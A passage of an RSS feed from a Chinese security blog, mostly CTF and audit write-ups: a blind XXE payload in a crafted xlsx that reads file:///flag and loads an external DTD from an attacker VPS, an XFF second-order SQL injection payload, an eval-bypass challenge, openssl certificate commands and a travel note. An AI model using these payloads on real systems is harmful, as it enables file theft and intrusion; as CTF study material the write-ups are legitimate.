&lt;p&gt;​        &lt;img loading=&#34;lazy&#34; src=&#34;https://dragonbox.top/images/qBJnenyW6ts6Vglb.png__thumbnail&#34; alt=&#34;img&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现有一个war包,下载下来进行源码审计, 发现一处突兀的地方&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;        if (filename.startsWith(&amp;#34;excel-&amp;#34;) &amp;amp;&amp;amp; &amp;#34;xlsx&amp;#34;.equals(fileExtName))
          try {
            Workbook wb1 = WorkbookFactory.create(in);
            Sheet sheet = wb1.getSheetAt(0);
            System.out.println(sheet.getFirstRowNum());
          } catch (InvalidFormatException e) {
            System.err.println(&amp;#34;poi-ooxml-3.10 has something wrong&amp;#34;);
            e.printStackTrace();
          }  
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里会对exce开头而且后缀名为xlsx的文件进行一个解析, 考虑一下使用xlsx来进行blind xxe, 具体可以参考 &lt;a href=&#34;https://www.jishuwen.com/d/2inW/zh-hk&#34;&gt;https://www.jishuwen.com/d/2inW/zh-hk&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;新建一个xlsx文档, 解压, 修改&lt;code&gt;Content_Types.xml&lt;/code&gt;的内容为&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34;?&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!DOCTYPE r [
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!ENTITY % data3 SYSTEM &amp;#34;file:///flag&amp;#34;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!ENTITY % sp SYSTEM &amp;#34;http://vps/ext.dtd&amp;#34;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;%sp;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;%param3;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;%exfil;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;]&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在vps上的web目录下面放置一个&lt;code&gt;ext.dtd&lt;/code&gt;, 内容如下:&lt;/p&gt;</description>
    </item>
    <item>
      <title>padding_oracle 和 cbc字节反转</title>
      <link>https://dragonbox.top/posts/sec-padding-oracle-and-cbc-attack/</link>
      <pubDate>Mon, 03 Feb 2020 16:42:20 +0000</pubDate>
      <guid>https://dragonbox.top/posts/sec-padding-oracle-and-cbc-attack/</guid>
      <description>&lt;p&gt;padding oracle 原理: &lt;a href=&#34;https://www.freebuf.com/articles/database/150606.html&#34;&gt;https://www.freebuf.com/articles/database/150606.html&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>临行前夜--2019</title>
      <link>https://dragonbox.top/posts/gossip-note-before-back/</link>
      <pubDate>Wed, 08 Jan 2020 05:29:24 +0000</pubDate>
      <guid>https://dragonbox.top/posts/gossip-note-before-back/</guid>
      <description>&lt;p&gt;昨晚约好的车今天早上竟然被司机一声不吭取消了, 真的无语&amp;hellip;&amp;hellip;得亏睡得浅起床看了一眼.新约的车又要早早开往机场, 于是无奈起了个大早. 到达后又被通知延误, 也不知和离开时候的飞雪有无关系, 但不管怎样, 孤身顶着鹅毛行走路上, 这样离开倒还是别有风味, 于是也有了碎碎念的兴致.&lt;/p&gt;</description>
    </item>
    <item>
      <title>java_web题目复现记录</title>
      <link>https://dragonbox.top/posts/sec-java-web/</link>
      <pubDate>Fri, 03 Jan 2020 10:57:44 +0000</pubDate>
      <guid>https://dragonbox.top/posts/sec-java-web/</guid>
      <description>&lt;p&gt;开一个新坑~~&lt;/p&gt;</description>
    </item>
    <item>
      <title>LD_PRELOAD劫持类型题目</title>
      <link>https://dragonbox.top/posts/sec-ld-preload%E5%8A%AB%E6%8C%81%E7%B1%BB%E5%9E%8B%E9%A2%98%E7%9B%AE/</link>
      <pubDate>Thu, 26 Dec 2019 16:37:19 +0000</pubDate>
      <guid>https://dragonbox.top/posts/sec-ld-preload%E5%8A%AB%E6%8C%81%E7%B1%BB%E5%9E%8B%E9%A2%98%E7%9B%AE/</guid>
      <description>&lt;p&gt;贴几个参考链接&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/wfzWebSecuity/p/11213732.html&#34;&gt;https://www.cnblogs.com/wfzWebSecuity/p/11213732.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD&#34;&gt;https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>copperstudy-record</title>
      <link>https://dragonbox.top/posts/ctf-qwb-copperstudy-record/</link>
      <pubDate>Thu, 19 Dec 2019 20:51:05 +0000</pubDate>
      <guid>https://dragonbox.top/posts/ctf-qwb-copperstudy-record/</guid>
      <description>&lt;h2 id=&#34;强网杯-2019-copperstudy&#34;&gt;强网杯 2019 copperstudy&lt;/h2&gt;
&lt;p&gt;拖拖拉拉终于把这题复现了&amp;hellip;&lt;/p&gt;
&lt;p&gt;开局计算哈希, 爆破爆破&lt;/p&gt;</description>
    </item>
    <item>
      <title>RoarCTF 2019复现</title>
      <link>https://dragonbox.top/posts/ctf-roarctfwp/</link>
      <pubDate>Tue, 22 Oct 2019 08:32:09 +0000</pubDate>
      <guid>https://dragonbox.top/posts/ctf-roarctfwp/</guid>
      <description>&lt;h1 id=&#34;web&#34;&gt;web&lt;/h1&gt;
&lt;h2 id=&#34;online_proxy&#34;&gt;online_proxy&lt;/h2&gt;
&lt;p&gt;特征: 第一次登录后源代码内容有如下:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;image-20211114142027467.png&#34; alt=&#34;image-20211114142027467&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;换一个&lt;strong&gt;X-Forwarded-For&lt;/strong&gt; 后会发现currentip是根据xff判别的&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;image-20211114142033017.png&#34; alt=&#34;image-20211114142033017&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;那么有理由认为上一个ip被存储进了数据库中,并在每次检测到访问ip和上一个ip不同的时候就会改变数据库. 源码这里也写到了&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;query&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;select current_ip, last_ip from ip_log where uuid = &amp;#39;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;addslashes&lt;/span&gt;($uuid)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#39;&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;count&lt;/span&gt;($result) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;($ip &lt;span style=&#34;color:#f92672&#34;&gt;!==&lt;/span&gt; $result[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;][&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;current_ip&amp;#39;&lt;/span&gt;]) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        $last_ip &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $result[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;][&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;current_ip&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;query&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;delete from ip_log where uuid=&amp;#39;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;addslashes&lt;/span&gt;($uuid)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#39;&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        $last_ip &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $result[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;][&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;last_ip&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;query&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;insert into ip_log values (&amp;#39;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;addslashes&lt;/span&gt;($uuid)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#39;, &amp;#39;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;addslashes&lt;/span&gt;($ip)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#39;, &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$last_ip&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;);&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;die&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;lt;!-- Debug Info: &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; Duration: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$time&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; s &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; Current Ip: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$ip&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;($last_ip &lt;span style=&#34;color:#f92672&#34;&gt;!==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;?&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Last Ip: &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;$last_ip &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; --&amp;gt;&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;解法:&lt;/p&gt;
&lt;p&gt;先用&lt;code&gt;1&#39;|1|&#39;1&lt;/code&gt;作为xff访问网站网站 , 访问成功之后改变xff, 再次访问, 这个时候由于前后xff不一致, 原来存储进数据库currentip的ip被重新提取出来存进lastip项中, 如果这个lastip没有过滤的话,就可以造成&lt;strong&gt;二次注入&lt;/strong&gt;, 事实上也确实如此, 但这个可能得猜&amp;hellip;&amp;hellip;在第二次访问之后, payload被重新插入进数据库中, 带着第二次访问的xff来第三次访问这个网站,可以看到&lt;/p&gt;</description>
    </item>
    <item>
      <title>bytectf2019</title>
      <link>https://dragonbox.top/posts/ctf-bytectf2019/</link>
      <pubDate>Mon, 09 Sep 2019 08:18:25 +0000</pubDate>
      <guid>https://dragonbox.top/posts/ctf-bytectf2019/</guid>
      <description>&lt;h2 id=&#34;boring-code&#34;&gt;boring code&lt;/h2&gt;
&lt;p&gt;source code&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;is_valid_url&lt;/span&gt;($url) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;filter_var&lt;/span&gt;($url, &lt;span style=&#34;color:#a6e22e&#34;&gt;FILTER_VALIDATE_URL&lt;/span&gt;)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;preg_match&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/data:\/\//i&amp;#39;&lt;/span&gt;, $url)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;isset&lt;/span&gt;($_POST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;url&amp;#39;&lt;/span&gt;])){
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    $url &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $_POST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;url&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;is_valid_url&lt;/span&gt;($url)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        $r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;parse_url&lt;/span&gt;($url);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;preg_match&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/baidu\.com$/&amp;#39;&lt;/span&gt;, $r[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;host&amp;#39;&lt;/span&gt;])) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            $code &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;file_get_contents&lt;/span&gt;($url);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;===&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;preg_replace&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/[a-z]+\((?R)?\)/&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;NULL&lt;/span&gt;, $code)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;preg_match&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&amp;#39;&lt;/span&gt;, $code)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;bye~&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    &lt;span style=&#34;color:#66d9ef&#34;&gt;eval&lt;/span&gt;($code);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;error: host not allowed&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;error: invalid url&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;highlight_file&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;__FILE__&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;思路: 注册一个xxxxbaidu.com 形式的域名.绑定到服务器上后放上自己的代码,payload&lt;/p&gt;</description>
    </item>
    <item>
      <title>php session反序列化</title>
      <link>https://dragonbox.top/posts/sec-php%E7%9A%84%E4%B8%A4%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</link>
      <pubDate>Mon, 02 Sep 2019 13:40:59 +0000</pubDate>
      <guid>https://dragonbox.top/posts/sec-php%E7%9A%84%E4%B8%A4%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</guid>
      <description>&lt;p&gt;php中的反序列化分为两类: 一种是常规ctf题目中的直接传入并反序列化, 另一种和session有关:&lt;/p&gt;</description>
    </item>
    <item>
      <title>证书相关</title>
      <link>https://dragonbox.top/posts/tech-openssl/</link>
      <pubDate>Sun, 01 Sep 2019 15:23:10 +0000</pubDate>
      <guid>https://dragonbox.top/posts/tech-openssl/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;来看看互联网世界的基石&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;通信过程的简化模型&#34;&gt;通信过程的简化模型&lt;/h2&gt;
&lt;h3 id=&#34;第一阶段-服务器向ca发起证书签名请求&#34;&gt;第一阶段: 服务器向CA发起证书签名请求&lt;/h3&gt;
&lt;p&gt;服务器组织生成一个私钥&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;openssl genrsa -out target.key &lt;span style=&#34;color:#ae81ff&#34;&gt;1024&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;从私钥文件中得到公钥, 这个公钥会被用于给CA签名&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;openssl rsa -in target.key -pubout -out target_pub.key
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;使用私钥生成一个证书签名请求, 在生成过程中需要填写证书申请人的一些信息&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;openssl req -new -key target.key -out target.csr
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;生成完成后, 可以运行下面命令看看这个证书签名请求文件里都有什么&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;openssl req -text -in target.csr  -verify
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;例如:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;image-20221223112026855.png&#34; alt=&#34;image-20221223112026855&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;可以看到公钥也在里面.&lt;/p&gt;
&lt;p&gt;接下来把证书签名请求文件提交给CA, CA审核通过后对该文件进行签名&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;openssl x509 -in target.csr -out target.crt -req -signkey ca.key -days &lt;span style=&#34;color:#ae81ff&#34;&gt;365&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;target.crt就是签名成功后的证书. 对于常见的自签名场景来说, &lt;code&gt;ca.key&lt;/code&gt;就是&lt;code&gt;target.key&lt;/code&gt;, 用自己的密钥去签名自己的证书请求, 自签名请求命令就是&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;openssl x509 -in target.csr -out target.crt -req -signkey target.key -days &lt;span style=&#34;color:#ae81ff&#34;&gt;365&lt;/span&gt;
